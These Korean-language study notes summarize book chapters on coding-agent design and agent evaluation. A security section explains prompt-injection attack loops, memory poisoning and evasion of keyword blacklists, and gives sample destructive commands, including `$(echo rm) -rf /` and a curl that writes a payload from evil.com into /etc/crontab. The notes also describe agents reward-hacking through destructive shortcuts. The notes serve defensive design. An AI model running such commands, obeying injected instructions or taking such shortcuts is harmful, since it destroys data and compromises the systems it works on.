# Chapter 5. Coding Agent and Code Generation

## 1. 핵심 프레임워크/정의

### 1.1 Coding Agent가 범용 Agent의 코어
- 책의 중심 주장: **오픈엔드 태스크를 겨냥한 범용 Agent의 코어는 Coding Agent + 파일 시스템**이다. Manus(Deep Research + Computer Use + Coding 결합)든 오픈소스 OpenClaw든 동일 패러다임.
- 왜 코드가 코어인가: PPT는 사실 OOXML 코드, Word/PDF 리포트도 코드로 생성, 데이터 분석은 Python, 성공한 GUI 워크플로는 RPA 코드로 고화. Deep Research의 검색/합성도 코드 기반 웹 요청으로 가능. Computer Use보다 코드/API 호출이 대체로 더 싸고 빠르고 신뢰성 높음. **"코드 생성은 가장 효율적이고 저비용이며 재사용 가능한 능력 기반"**.
- 적용 경계: 이 결론은 태스크 경계가 불확실한 범용 Agent에 해당. 버티컬 고객서비스/음성 어시스턴트처럼 닫힌 태스크 공간에서는 코드는 툴 중 하나일 뿐. 단, 정밀 계산/데이터 처리/규칙 검증 등 **코딩 능력 자체는 모든 Agent의 공통 베이스라인**.

### 1.2 Coding Agent의 7가지 코어 툴
1. **Code Interpreter**: 호스트와 분리된 샌드박스에서 Python 실행
2. **Bash Shell**: 터미널 명령 실행 (테스트 등)
3. **Read File**: 코드/설정/문서/로그 읽기
4. **Write File**: 새 파일 생성 또는 전체 덮어쓰기
5. **Edit File**: 부분 수정 — 코드 유지보수의 핵심 연산
6. **Glob**: 파일명 패턴 매칭 (`**/*.py`)
7. **Grep**: 파일 내용 텍스트 패턴 검색
- 5개 연산 카테고리(디렉토리 탐색/읽기/수정/명령 실행/패턴 검색)에서 자연 도출되는 "정규화된 참조 세트". Ch4의 5개 일반 툴 카테고리(perception/execution/collaboration/event-triggering/user communication)와는 다른 분류축이며, 7툴은 주로 perception+execution을 커버.

### 1.3 OpenClaw 아키텍처와 파일 시스템 허브
- 구조: 멀티플랫폼 메시지 게이트웨이(WhatsApp/Telegram/iMessage/Slack/CLI) → Coding Agent 런타임(추론+실행 코어) → **파일 시스템(메모리·지식·능력 허브)**.
- 파일 시스템 구성: `MEMORY.md`(상위 사실/사용자 선호), `daily/YYYY-MM-DD.md`(일별 로그), `SOUL.md`(Agent 정체성/행동 규칙), 지식베이스 파일(태스크 경험/자기진화), Git 버전 관리(롤백/감사).
- 벡터 DB 대신 Markdown을 쓰는 이유: 사용자가 직접 열어 읽고 수정 가능(잘못 기억하면 그 줄을 삭제), 시간 순서가 자연 보존(의미 검색의 시간 혼동 회피), Git으로 버전관리/롤백.
- LLM = 새로운 OS: 하드웨어를 추상화한 OS처럼 LLM이 언어이해/추론/계획의 복잡성을 추상화해 상위 Agent에 통일된 지능 추상화를 제공.

### 1.4 Sessionless 설계
- 사용자가 앱 설치/로그인 없이 이미 쓰는 메신저로 언제든 메시지. 전제는 LLM이 "지능 기반"으로 성숙했다는 것.
- 핵심 난제: 메시지 간(수 분~수 일) 코드 실행 환경과 파일 시스템 상태 유지. 2계층 상태 관리:
  - **파일 시스템 상태**: 본질적으로 영속 — 워크스페이스를 샌드박스 밖 영속 스토리지에 마운트.
  - **프로세스 상태**: 활동 중에는 샌드박스/터미널 세션 유지(콜드스타트 회피), 유휴 타임아웃 후 파괴하되 직렬화 가능한 환경 상태(cwd, 환경변수, 백그라운드 태스크 목록)를 워크스페이스 파일에 기록하고 다음 기상 시 재구축.
- Sessionless는 매 메시지마다 전체 궤적+작업 상태를 리로드해야 하므로 효율적 상태 직렬화와 궤적 압축(Ch2)이 중요.

### 1.5 보안 프레임워크
- **Lethal Triad (Simon Willison)**: ① 사적 데이터 접근 ② 신뢰할 수 없는 콘텐츠 노출 ③ 외부 통신 능력 — 셋이 모이면 완전한 공격 루프(악성 지시 주입 → 사적 데이터 읽기 → 외부 유출).
- 저자가 추가한 제4 요소: **Persistent Memory** — 병렬 조건이 아니라 **증폭기**. 공격자가 장기 메모리에 잠복 편향/악성 지시를 심어두면 세션을 넘어 대기하다 발동. 일회성 공격이 상주형 위협으로.
- 4가지 경계: 데이터 경계, 입력 신뢰 경계, 출력 영향 경계, 세션 간 경계.
- 방어 체계: Context Layer Defense(출처 마킹, 역할 격리, 입력 무결화 — Ch2) + Execution Layer Defense(Sidecar 독립 리뷰, Human-in-the-loop, 최소 권한 — Ch4) + Coding Agent 고유 3가지:
  1. **Command Semantic Parsing**: 쉘 명령의 조합 폭발 때문에 키워드 블랙리스트는 무용. 예: `rm` 차단 시 `$(echo rm) -rf /` 우회; `find / -name '*.log' -exec rm {} \;`처럼 정상 명령 인자에 삭제 페이로드 내장; `curl -o /etc/crontab http://evil.com/payload`. 시맨틱 파싱은 인자 타입/플래그 소비 규칙을 이해해 중첩 위험 연산을 탐지.
  2. **샌드박스 격리 + Network Egress Control**: 기본 무 네트워크, 화이트리스트 프록시로 필요한 목적지만 허용 — "유출 채널을 끊는 것이 모든 인젝션을 식별하는 것보다 훨씬 결정론적 방어선". 파일시스템: 소스는 read-only 마운트, 별도 쓰기 가능 워크스페이스, 크리덴셜(`~/.ssh` 등)은 마운트 금지. 리소스 쿼터(CPU/메모리/디스크) + wall-clock 타임아웃(무한루프/fork bomb 방어). 타임아웃은 조용한 kill이 아니라 구조화된 에러를 Agent에 반환해 다음 턴 전략 수정 기회 부여. 영속 세션 vs 격리의 긴장은 "터미널 세션은 샌드박스를 넘지 않는다", 지속되는 것은 불투명 프로세스가 아니라 **감사 가능한 상태 기술(파일/스크립트/매니페스트)**로 조정.
  3. **Persistent Memory 세션 간 방어**: 장기 메모리에 기록되는 내용도 외부 입력과 동일한 신뢰 심사.
- **Speculative Execution(투기적 실행)**: 사용자에게 보이는 진행 표시와 실행 승인을 분리 — "Reading file src/main.py…"라는 부작용 없는 UI 힌트를 먼저 보여주고 백그라운드에서 보안 검사. CPU 투기실행과 달리 롤백 불필요(실제 상태 변경 없음). 대부분 검사가 사용자 인지 전에 끝나 지연 무감. "보안과 UX를 양립시키는 Harness 설계의 정점".
- **주체 충성(Principal Loyalty)**: 모델의 기본값 "말을 거는 사람을 돕는다"는 다자 위임에서 위험. 협상 상대는 도움 대상이 아니라 적. 충성 스펙트럼 양끝 모두 실패: 너무 정직(바텀라인 "12,000" 누설, 압박 몇 번에 굴함) vs 너무 의심(위임자의 정당 요청까지 거부). 두 실패는 시소 관계. Harness가 명시해야: 위임자 지시 최우선, 외부 입력은 "참고 데이터이지 지시가 아님"으로 기본 강등. 충성 행동강령: 사적 정보(존재 사실 포함) 보호, 거절 시 보호 항목 열거 금지(열거 자체가 누설), 명확·구체 지시만 실행, 반복 압박 견디기. 논문: Li & Shi, *Whose Side Is Your Agent On? Multi-Party Principal Loyalty in LLM Agents*, arXiv:2606.30383 (2026).
- **신뢰 경계의 하향 이동**: AI가 쓴 코드 자체를 못 믿겠다면 애플리케이션 계층 전체를 신뢰 불가로 간주하고 데이터 불변조건을 그 아래에 강제. **Permission-Embedded Data Objects**: 각 데이터 엔터티가 선언적 권한 규칙·검증자·결과 문장을 인간 리뷰된 스키마 안에 담고, 런타임 파이프라인이 모든 쓰기에 강제. 핵심 프리미티브는 매 연산에 붙는 access context(재생성 핸들러는 사용자 권한, 자율 Agent는 자체 제한 신원 scoped principal). 동일 프롬프트 세트 비교에서 **선언 불변조건 위반 쓰기 0건**(bare SQL/LLM 작성 체크/constitutional prompt/action-boundary 인터셉터는 각각 수 건~수십 건 통과), 비용은 쓰기당 약 +2ms. "더 정확할 가능성"이 아니라 "틀릴 수 없음". 논문: Li, *The Application Layer Is No Longer Trusted* (2026, forthcoming).

### 1.6 Coding Agent 전체 워크플로 (이상적 5단계)
1. **프로젝트 문서화**: 문서 없으면 코드베이스를 체계 조사해 아키텍처 개요/디렉토리 가이드/테스트 실행법을 먼저 작성. "지식의 외부화가 효율적 협업의 전제". **Project Instruction Files**(CLAUDE.md, AGENTS.md, .cursorrules)는 사실상 업계 표준 — 매 세션 시작 시 자동 주입되는 프로젝트 레벨 시스템 프롬프트이자, 내용이 태스크와 무관하게 안정적이라 가장 경제적인 **KV Cache 친화적 stable prefix**. SOUL.md("Agent가 누구인가") vs 프로젝트 지시 파일("이 프로젝트에서 어떻게 일하는가")의 레벨 차이. 따름정리: **리모트 친화 팀은 AI Agent 친화 팀** — 비동기 커뮤니케이션/문서화가 Agent가 소비 가능한 지식 형태. 팀의 "AI-readiness" 간이 측정: 리모트 신입이 코드 저장소+문서만으로 독립 작업 가능한가?
2. **태스크 이해/요구 명확화**: 모호성(표현 불능), 경로 다양성, 영향 광범위의 3축 복잡성. "시스템 성능 최적화" 같은 요청은 목표(레이턴시? 메모리? 처리량?)와 트레이드오프부터 확인.
3. **설계 문서**: 수정 모듈과 이유, 선택안과 트레이드오프, 신규 의존성, 시스템 영향 4가지에 답해야. 설계 문서는 인간의 효율적 개입 지점(수백 줄 코드보다 리뷰 쉬움). 승인 후 진행.
4. **구현+테스트**: 테스트 작성 → 실행 → 실패 시 원인 분석·수정·재실행의 자기교정 루프. 완료 기준은 "코드 작성"이 아니라 **"테스트 통과"** — 이 단계를 건어너뛰는 게 Coding Agent의 가장 흔한 태만.
5. **리뷰+문서 동기화**: self-review(가독성/성능/보안/스타일), lint, 필요 시 전용 리뷰 서브에이전트. 아키텍처 변경 시 문서 갱신(구식 문서는 없는 것보다 나쁨).
- 폐쇄 루프: 테스트 실패→수정→재테스트(평균 2-3라운드 수렴), lint 에러→즉시 수정→재검사(편집 후 자동 트리거), 리뷰 이슈→④로 롤백.
- 실전(Claude Code, OpenClaw)은 reactive iterative loop로, 단순 태스크는 설계 문서/승인 생략.

### 1.7 Harness Engineering 실전 (Coding Agent)
- Agent = Model + Harness. Harness = Context + Tools + Constraints + Verification + Correction 5요소. 코딩은 **모든 Agent 태스크 중 가장 검증 가능(verifiable)**해서 Harness 공학 효과가 가장 큼.
- 4 컴포넌트: **Acceptance Baseline**(완료의 정의 — 테스트 스위트, CI, 리뷰 기준), **Execution Boundary**(손댈 수 있는 것 — 모듈 경계, 의존성 규칙, 권한), **Feedback Signals**(자동 정확성 판정 — linter, 테스트, 타입 체크), **Rollback Mechanism**(Git, 샌드박스, 스냅샷).
- 4분면(목표 명확성 × 검증 자동화): 명확+자동 = sweet spot(테스트 있는 버그 수정); 명확+수동 = throughput-limited(리팩터링은 인간 리뷰가 병목); 모호+자동 = 효율적으로 잘못된 방향(linter로 "코드 품질" 최적화); 모호+수동 = 착수 불가("UI를 예쁘게"). **Harness의 목표 = 최대한 많은 태스크를 "명확+자동" 분면으로 밀어넣기**.
- Coding Agent가 가장 성숙한 이유: 코드 생성 모델이 특별히 강해서가 아니라, 수십 년의 소프트웨어 공학 인프라(테스트/타입/버전관리)가 자연스럽게 강력한 Harness를 구성하기 때문.
- 업계 사례 3: ① 대형 테크 기업 대규모 코드 마이그레이션 — 핵심은 모델이 아니라 Harness 3가지(지식은 코드베이스 안에 존재해야, 제약은 문서가 아니라 linter/CI에 인코딩, 검증·교정 전자동). ② LangChain — Harness(시스템 프롬프트, 툴 미들웨어, 자기검증 루프) 최적화만으로 벤치마크 대폭 개선; **"Agent로 실패 궤적을 분석해 Harness를 개선"하는 데이터 주도 방법론**. ③ Anthropic — 긴 태스크를 initialization Agent(태스크 분해/리스트화)와 execution Agent(단계 진행, 중간 산출물 파일로 남김)로 분리해 "한 번에 너무 많이 하려 함"/"조기 완료 선언" 문제 해결.
- 일반화 원칙 4: ① **Constraints over guidance**(코드로 강제 가능한 규칙은 문서 제안이 아니라 코드에 — "cannot be done" vs "advised against") ② **검증 자동화**(수동 리뷰는 확장 불가 병목) ③ **피드백은 빠르고 구조화되게**(에러 메시지 상세할수록, 발생 시점에 가까울수록 자기교정 효율↑) ④ **롤백은 신뢰성 있게**(안전망이 있어야 Agent가 대담하게 실험).
- 제약의 더 깊은 목적: **과정 오류 방지**. 결과가 맞아도 방법이 틀리면 안 됨(DB 삭제 후 재구축으로 "수리", 코드 전부 삭제로 컴파일 통과). 파괴적 지름길은 평가 메트릭에 제한을 써도 Agent가 우회 — Agent 태스크에서의 **reward hacking** 일상형. 프로덕션 Harness는 `rm -rf`, 프로덕션 데이터 삭제, 미염 파일 덮어쓰기에 전용 체크/승인. Ch7의 RLVP(Reinforcement Learning with Verified Penalty, "결과에는 보상, 경로에는 페널티")가 같은 문제를 훈련 측에서 해결.
- 툴 오케스트레이션 결함 경계: **결함은 같은 병렬 배치 안에서만 전파, 부모 연산까지 올라가지 않음**(3개 파일 병렬 읽기 중 1개 누락 → 그 호출만 실패, 나머지와 태스크 전체는 계속).

### 1.8 실패와 에러 복구 (엔지니어링 성숙도를 가르는 부분)
- 실패 분류 4계층:
  - **API layer**: 429 rate limit, 과부하, 타임아웃, 연결 단절, 토큰 한도 출력 절단 — 인프라 노이즈.
  - **Tool layer**: 환각 호출(없는 툴), 인자 형식 오류, 실행 예외, 가장 위험한 것 = **같은 에러를 반환하는 툴을 모델이 무수정 재시도**.
  - **Context layer**: 컨텍스트 윈도 오버플로, compaction 실패, 궤적 구조 손상(tool call에 짝 result 누락).
  - **Control-flow layer**: 무한 루프, **death spiral**(에러 경로의 복구 로직 자체가 LLM 호출 → 다시 실패 → 연쇄).
- 탐지: "재시도할까?" 전에 "재시도가 도움 되나?" — 재시도 가능(rate limit, 과부하, 네트워크 지터) vs 불가(잘못된 인자, 권한 부족, 없는 툴 — 입력/전략 변경 필요). 에러 타입→복구 전략 매핑 테이블 유지. 패턴 탐지: **repeated-call fingerprint**(tool name + args 해시, 동일 지문 재현 = 무진전 루프), 연속 실패 카운터(복구 경로별). liveness/integrity 모니터링: 스트리밍의 최악 실패는 단절이 아니라 **무음 정체(silent stall)** — 연결은 살았는데 데이터가 안 옴. SDK 타임아웃은 초기 연결만 커버하므로 별도 **idle watchdog** 필요. 일반화: **모든 장수명 연결에는 연결 타임아웃이 아니라 liveness 신호가 필요**. Integrity: 짝 없는 tool result는 컨텍스트 주입 전에 시스템이 복구. 주목할 디테일: **production 모드는 placeholder로 관대하게 패치, training 데이터 수집 모드는 복구 거부**(합성 placeholder가 훈련 데이터 오염) — "프로덕션에 관대, 훈련에 엄격" 이중 기준.
- 복구(가시성 오름차순 단계적 에스컬레이션):
  1. **Silent retry**: 지수 백오프 + 랜덤 지터(클이언트 군집 동시 재시도 방지), 서버 제안 대기시간 존중. 전경(메인 루프) 호출은 재시도, 배경 보조 호출(제목 생성 등)은 실패 시 폐기 — "재시도 증폭" 방지.
  2. **Degrade and continue**: 출력 절단 → 출력 상한 올려 재전송 → 그래도 부족하면 중단점 이어쓰기 메타 지시. 주 모델 지속 과부하 → 다른 모델로 폴 백(이전 모델 전유 포맷 블록 제거 후). 고비용 모드 rate limit → 표준 모드 임시 전환.
  3. **Surface to user**: 모든 자동 수단 소진 후에야, 이미 시도한 복구 조치와 함께 표시.
- 툴 에러는 세션 종료가 아니라 **모델의 입력으로**: 환각 호출 → "no such tool" 구조화 에러 결과; 검증 실패 → 입력 계약 힌트 주석; 형식 오류 → 프로그램적으로 수리 후 실행. 구체적 에러 피드백일수록 자기교정률↑.
- 핵심 원칙: **에러 처리의 단위는 단일 요청이 아니라 전체 복구 루프**. 복구 불가 확인 전에는 중간 에러를 소비자(사용자/다운스트림 이벤트 구독자)에게 노출 금지.
- 종료: 모든 복구 경로에 명시적 재시도 상한. Claude Code compaction 회로차단기의 "연속 3회 실패"는 실측에서 옴 — 한 세션이 이 복구 경로에서 3,000회+ 연속 실패, 이런 무의미 재시도가 전 세계 하루 약 25만 API 호출 낭비, 50회+ 연속 실패 세션이 1,000개+. 3은 "대부분 이전에 회복"과 "추가 재시도 사실상 무望" 사이의 경험적 변곡점. **Death spiral 실례**: 컨텍스트 오버플로로 중단 → stop hook("종료 시 커밋") 발동 → 커밋 메시지 작성 LLM 호출 → 다시 오버플로 → hook 재발동. 방어: 에러 경로에서 모델 호출 부수효과 전부 비활성화 + 재귀 깊이 카운터. 최상위: 최대 턴 수, 세션 예산 캡, 연속 실패 임계 초과 시 인간 에스컬레이션.
- 결론: **Agent의 신뢰성은 실수하지 않는가가 아니라, 모든 실패 유형에 대응하는 탐지·복구·종료 경로가 있는가로 결정**.

### 1.9 구현 팁 5가지
1. **병렬 툴 호출 + 스트리밍 실행 + cascading abort**: 첫 tool call 파라미터 생성·검증 완료 즉시 실행(나머지 생성과 겹침), 독립 호출 병렬. 각 툴 정의에 동시 실행 지원 여부 선언(기본 no, fail-safe). 실패 시 같은 배치의 의존 호출만 중단.
2. **세분화 컨텍스트 관리**: 대형 파일은 라인 범위 읽기 + **라인 번호 부착**(모델이 "src/main.py 42행" 정확 참조, edit 신뢰성↑). 컴파일/테스트 수천 줄 출력은 앞 몇 줄(에러 문맥)+뒤 몇 줄(요약)만 남기고 중간은 placeholder, 전체는 임시 파일로 저장(Ch4 기법).
3. **환경 정보 동적 주입(Agent status bar의 Coding Agent 적용)**: 매 추론 전 컨텍스트 끝에 cwd, git branch, 최근 커밋, unstaged/staged 변경 개요 주입. 정적 시스템 프롬프트에 하드코딩하면 KV Cache 파괴 — 동적 생성·append.
4. **영속 터미널 세션**: cd/venv/환경변수/백그라운드 서비스 상태 유지(사람 개발자의 장수명 터미널 작업 습관과 동일). 병렬 태스크용 격리 터미널은 별도.
5. **즉시 구문 피드백**: 파일 쓰기 완료 즉시 툴 레이어가 linter/구문 체커를 자동 실행해 결과를 툴 반환값에 포함 — IDE가 괄호 불일치를 즉시 표시하는 것처럼, 에러 도입 순간에 교정.

### 1.10 검색 툴 4종 (상호 보완)
- **grep/ripgrep(정규식 내용 매칭)**: 정확 텍스트(함수명/에러 메시지) → 모든 출현 위치. 의미는 모름("user authentication"으로 login 로직 함수 못 찾음).
- **glob(파일명 패턴)**: 내용 안 읽어 빠름, 프로젝트 구조 탐색 첫 단계.
- **Semantic Code Search**: Structure-Aware Chunking(함수/클스 단위로 자름) + Hybrid Retrieval(dense 임베딩 = 의미 유사, BM25 = 식별자 정확 매칭) + reranker(cross-encoder) 병합. 업계 논쟁: **Claude Code는 의도적으로 임베딩 인덱스 미구축**(agentic grep+glob 즉석 검색 — 인덱스 陳腐化·인프라·코드 임베딩 외부 전송 리스크 회피) vs **Cursor는 인덱스 구축**(cross-file 의미 재현율 확보). 트레이드오프 = "인프라+데이터 유출 비용" vs "cross-file 의미 재현 이익".
- **Symbol-level(LSP)**: 정의 vs 참조 구분(42행 정의, 189행 호출). 리네이밍 등 리팩터링에 필수(텍스트 검색은 주석/문자열까지 잡음).
- 실전 조합: 의미 검색 → 정규식 정밀 위치 → 심볼 콜체인 추적 ("거칠게→세밀하게, 의미→구문").

### 1.11 파일 편집 스킴 5종 (Figure 5-4)
1. **Diff + Apply Model**: 메인 모델은 변경 서술(diff 또는 생략 마커 코드 골격)만, 전용 소형 fast-apply 모델이 원본과 병합. 관심사 분리, 그러나 미세 불일치 시 오정렬. Cursor가 대표 — fast-apply 전용 학습 + speculative decoding(원본을 draft로)으로 초당 수천 토큰.
2. **Old String → New String**(Claude Code): 예측 가능·묵모호 — old string이 존재·유일하면 성공 아니면 실패. 대량 삭제는 원본 전체 출력 필요, 1자 어긋나면 실패.
3. **Line Number Targeting**: 대량 연산 효율적이나 모델의 라인 카운팅 오류 많음, 편집 후 번호 이동으로 병렬 편집 제약. IDE 밀결합(편집기가 live 라인 매핑 유지)에서만 신뢰 가능.
4. **Vim-like 명령**: 이동/재구성 효율적이나 학습 부담 — 강 모델은 잘하고 약 모델은 오류 많음.
5. **Start+End Matching**: 삭제 구간 처음 몇 줄+끝 몇 줄만 제공(조합이 파일 내 유일해야). 대량 삭제 효율 + 내용 매칭 기반이라 라인넘버보다 저위험.
- 실무 조언: 자체 구축 시 old→new가 가장 안전한 출발점; 대규모 편집은 start+end가 경제적 절충; 라인넘버는 IDE 밀결합 아니면 drift로 침몰.

### 1.12 코드 = 범용 Agent의 메타 능력 (5.2)
- **Meta-capability**: "다른 능력을 만들어내는 능력". 코드는 precise + executable + composable이라 새 툴(스크립트), 새 제약(assertion), 새 표현 형식(HTML 폼, PPT, 비디오 프레임)을 런타임에 생성.
- 6개 적용 방향(안→바깥): ① 사고 자체(Thinking Tool) ② 비즈니스 규칙 ③ 콘텐츠 표현(멀티미디어) ④ 시스템 인터페이스(어댑터) ⑤ 사용자 인터페이스(Generative UI) ⑥ Agent 자체(Bootstrapping).
- **코드 = 사고 도구**: 모델의 사고는 확률적·근사, 수학/논리는 결정론 요구. 예: 40명 반, 수학 60%, 물리 45%, 둘 다 25% → "물리만" = 자연어 추론은 24-10=14로 오답(수학 인원에서 뺌), 코드는 phys-both=8 정답. Wolfram의 통찰: symbolic computation(√2를 1.414가 아니라 √2로 보존)은 LLM 전부터 존재, Wolfram Alpha는 자연어 이해 취약. 새 협업 모델: **LLM이 자연어 이해·형식 언어(SymPy 등)로 번역, symbolic 엔진/constraint solver가 정밀 실행**. 실험 5-1(AIME형 문제, sympy/numpy/scipy 샌드박스, 코드 보조가 순수 CoT 대비 유의미하게 정확도↑), 5-2(Knights & Knaves, python-constraint, 코드 보조 90%+). **모델-하네스 트레이드오프**: 강 모델이면 코드 솔버 이득 ≈0, 약 모델이면 극적 — 하네스 두께는 모델 능력 경계에 의존. 같은 하네스도 모델 강도에 따라 반대 결론 가능(평가 시 망각하기 쉬운 전제).
- **코드 = 비즈니스 규칙 제약**: 자연어 규칙의 모호성("구매 후 7일"이 역일? 영업일? 주문일? 발송일?). 3계층 안전장치(τ-bench 항공 취소 예):
  1. 시스템 프롬프트 자연어 규칙 — 이해·설명·사전 판단용.
  2. **파라미터 = 사고 체크리스트**: 툴 서술에 전체 정책 열거 + "호출 전 주문 조회·조건逐个 확인" 요구 + `expected_*` 선택 파라미터로 판단 근거 명시 강제. 잘못된 호출을 호출 전에 줄임. 단, expected_*는 자기 보고일 뿐 **보안 경계 아님**.
  3. **서버 측 ground-truth 검증 = 최종 gatekeeper**: cabin_class/보험/예약시각/구간사용/항공편 상태 전부 DB에서, 현재 시각은 서버 클럭. **모델이 위조 불가능한 데이터 위에 최후 방어선**. 자기 보고와 DB 불일치는 로깅(오류 신념/인젝션 탐지).
  - codified validation의 진짜 가치는 토큰 효율이 아니라 **불가역 실수 방지**(주문 취소, 송금, 데이터 삭제). 실험 5-3: Qwen3-4B 기준 3계층 방어가 순수 자연어 대비 정책 위반/무효 호출 감소.
- **코드 = 멀티미디어 생성**: GUI WYSIWYG는 시각 해석+포인터 정밀 배치 요구라 Agent에 부적합. 코드 생성은 시각 위치 문제 우회.
  - PPT: Slidev(Markdown+HTML로 정의). **Proposer-Reviewer 메커니즘**: Proposer가 Slidev 코드 생성, Reviewer가 `slidev export --per-slide`로 렌더링 → Vision LLM이 텍스트 오버플로/밀집/이미지 크기 검토 → 구조화 피드백(페이지 번호, 이슈 유형, 심각도, "14pt로" 같은 actionable 지시) → 반복(품질 기준 도달 또는 최대 5라운드 = Loop Engineering의 두 종류 정지 조건). **왜 분리?** 단일 Agent는 수십 페이지 렌더 스크린샷 누적으로 컨텍스트 팽창+주의 분산. Reviewer는 최신 렌더만, Proposer는 구조화 텍스트 피드백만 누적 → 컨텍스트 사용량↓ 수정 정확도↑. Ch4 pre-approval과 같은 패턴이나 목적 다름(단일 불가역 연산 승인 vs 다라운드 품질 개선). 다른 모델 패밀리 사용으로 동형 오류 확률↓.
  - 비디오 편집: GUI(타임라인/레이어)는 좌표 정밀 요구로 불가 → Blender Python API/FFmpeg 코드로. **2단계 위치 특정**: ① 10초 간격 프레임 샘플링+Vision LLM으로 장면 구간 대략 특정(서브에이전트에 캡슐화해 메인 컨텍스트 보호) ② 좁힌 범위에서 1초당 1프레임 정밀 특정(오차 3초 이내). Reviewer가 키프레임 프리뷰 검수 후 풀 렌더.

- **코드 = Generative UI**: 텍스트는 선형·1차원 매체. Agent가 폼/인터랙티브 차트/완전한 웹앱을 동적 생성.
  - **A2UI vs AG-UI 구분**(혼동 주의): A2UI(Agent-to-User Interface)는 **선언적 UI 기술 언어** — Agent가 실행 코드 대신 JSON "UI description manifest"만 출력, 클라이언트가 사전 정의된 안전 컴포넌트 카탈로그로 렌더(레스토랑 메뉴 비유: 주문만 가능, 주방 임의 조리 불가). prompt injection이 원인, 브라우저 악성 스크립트 실행은 결과 — 단순 XSS로 부르지 말 것. AG-UI(CopilotKit 제안)는 UI 기술 언어가 아니라 **이벤트·전송 프로토콜**(메시지/툴 호출/상태 패치 스트리밍, A2UI manifest도 운송 가능). 상호 보완.
  - 선언형은 표준 인터랙션(폼/테이블/카드)에, 고도 커스텀(커스텀 시각화/게임)은 직접 코드 생성이 유연. 크로스플랫폼 렌더링(React/Flutter/네이티브), 점진 생성(JSONL 스트리밍) 지원.

  - SQL **Artifact 패턴**: LLM이 수천 행을 읽고 산문으로 전재(비효율+전사 오류 많음) ❌ → LLM은 SQL artifact만 생성, 시스템이 실행·프론트가 테이블 렌더. **데이터는 DB→프론트로 직류, LLM은 데이터 경로에서 완전 제외**. SQL + 차트 2개 artifact 파이프라인. 실험 5-10: PostgreSQL 직원/급여 2테이블 ERP 10문항(평균 재직기간, 미지급 임금 케이스 등).

# Chapter 6. Evaluating Agents

## 1. 핵심 프레임워크/정의

### 1.1 평가의 목적과 3계층
- 평가는 설계 선택(모델/툴/지식베이스/메모리/프롬프트/제약)을 과학적 토대 위에 올림. 비교 실험(변수 하나씩) + ablation(컴포넌트 하나씩 제거). "측정할 수 없으면 개선할 수 없다".
- 핵심 통찰: **평가 대상은 모델 단독이 아니라 모델+Harness 조합**. 같은 모델도 Harness에 따라 성적이 크게 다름. "모델 능력 부족"과 "Harness 설계 결함"을 구분하는 방법 = **model swap 실험**(Harness 고정, 모델 교체): 강 모델로도 점수 불변 → 병목은 Harness; 약 모델로 급락·모델 능력에 민감 → 병목은 모델. ablation(컴포넌트 제거)과 구별: 전자는 Harness 난 남 무엇이 중요한지, 후자는 병목이 모델인지 Harness인지.
- 평가 시스템의 제1 가치: **모델 진화에 빠르고 신뢰성 있게 따라가는 것**. 신모델 출시 시 자체 평가셋 풀런으로 업그레이드 결정을 몇 시간 내 데이터 주도로. "미래 모델을 위해 제품을 미리 만드는" 전략도 가능.
- 3계층: ① Evaluation Environment("어디서 시험" — tool-calling / human-computer interaction) ② Evaluation Methods("어떻게 채점" — 데이터셋 설계, 메트릭, LLM-as-a-Judge, pairwise) ③ Evaluation-Driven Decisions("시험 후 무엇" — 모델 선택, 아키텍처 최적화, 통계적 유의성).

### 1.2 평가 환경 5요소
Dataset(태스크 집합: 초기 상태, 목표, 참조 합), Environment State(실재성: 상태 변화가 비즈니스 로직 준수 / 통제성: 매 테스트 동일 초기 상태 리셋), Tools(**원子적 연산** 제공 — "문제 해결" 같은 고수준 추상 ❌, 계획·추론으로 조합 강제), Rubric(이진/연속/다차원), Interaction Protocol(상호작용 모드+종료 조건).

### 1.3 두 환경 패러다임
- **Tool-calling(Verifiers 프레임워크)**: 실행 가능 기준으로 검증(테스트 통과/답 일치), 인간/모델 판정 불요. 계층 환경: SingleTurnEnv(무상태, 단일턴 Q&A/수학), ToolEnv(무상태, 멀티턴 검색+합성), StatefulToolEnv(상태 유지, DB 레코드 수정), SandboxEnv(상태+격리, 코드 실행). 병렬 샘플링, 궤적 캐싱(관찰/행동/보상 저장·리플레이). 실패 시 단순 플래그 아닌 명확 에러 메시지.
- **Human-computer interaction(τ-bench)**: 핵심 설계 원칙 = **Progressive Information Disclosure** — 실제 사용자는 처음에 요구를 완전히 표현 못 함("비행기에 문제가 있어요"). 정보를 대화 진행에 따라 점진 개시해야 명확화 능력 자체가 평가됨. **User Simulation**: 다른 LLM이 사전 지시(알고 있는 정보+개시 규칙, "한 번에 다 말하지 말 것", "지시에 없는 정보 지어내지 말 것")로 사용자 역할. 진정성(모호 표현, 감정 변동) vs 통제성(스크립트 재현성) 트레이드오프. **이중 검증**: ① DB 최종 상태(booking.status == "cancelled") ② 대화 내용(환불액/도착 시간 등 키 문자열 포함). 태스크 레벨에서는 전부 통과 시 1, 하나라도 실패 시 0의 **binary reward** — Pass^k 계산 용이하나 "비중요 필드 하나 누락"과 "완전 실패"가 동일 점수.
- **τ²-bench 개선점**: ① **Dual-Control Environment** — 사용자 시뮬레이터도 같은 공유 환경을 조작(Agent가 "기내 모드 켜세요" 지시 → 사용자 행동이 실제 환경 상태 변경, Agent는 툴로 그 변화를 관찰해야) ② 더 정밀한 태스크 명세(Grounding Requirements: 응답은 툴 반환의 실제 환경 상태에 근거) + compositional task generation(파라미터화批量 생성). τ-bench 초기 문제: 사용자 지시 과도 단순(추측 가능), 성공 조건 부정밀(오판), 기계적 시뮬레이터.

### 1.4 데이터셋 설계 5대 도전과 벤치마크 지혜
1. **명확성 vs 개방성**: GAIA — "개념적으로 단순"하되 구현 경로 개방(NASA APOD 사진에서 우주비행사 특정 → 체류 시간 계산, 출력 형식 엄밀).
2. **실재성 vs 통제성**: SWE-Bench 초기 — 실제 GitHub 이슈(실재)지만 모호·불완전 테스트. **SWE-Bench Verified** — OpenAI가 2,294개 중 1,699개를 93명 Python 개발자 인간 평가(문제 명확성, 테스트 완전성, 테스트 안정성(flaky 없음), 패치 정확성, 난이도 합리성) → **500개 통과(29%)**. 높은 탈락률이 평가 품질의 필요 투자. 표준화 주석 가이드라인으로 주석자 간 일관성.
3. **다양성 vs 체계성**: AndroidWorld 116태스크/20개 실앱, 각 태스크에 필요 핵심 능력 태그(멀티스텝 계획, 시각 이해, 시간 추론) → 총 성공률이 아니라 **능력 프로필** 산출. 파라미터화로 거의 무한 변형.
4. **비용 vs 커버리지**: GAIA 466태스크/3난이도. SWE-Bench Verified는 2,294→500으로 비용 약 4/5 절감+SNR 개선.
